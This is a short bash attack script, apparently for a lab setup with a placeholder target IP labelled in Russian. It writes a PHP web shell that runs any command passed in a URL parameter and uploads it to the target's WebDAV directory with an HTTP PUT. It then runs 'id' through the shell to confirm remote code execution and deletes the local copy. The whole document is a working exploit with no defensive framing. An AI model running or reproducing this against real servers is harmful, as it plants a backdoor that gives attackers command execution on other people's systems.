#!/bin/bash

TARGET_IP="IP_МАШИНЫ_2"

if [ -z "$TARGET_IP" ]; then
    exit 1
fi

echo '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>' > shell.php

curl -X PUT --data-binary @shell.php http://${TARGET_IP}/webdav/shell.php

sleep 1

curl -s "http://${TARGET_IP}/webdav/shell.php?cmd=id"

rm -f shell.php
exit 0
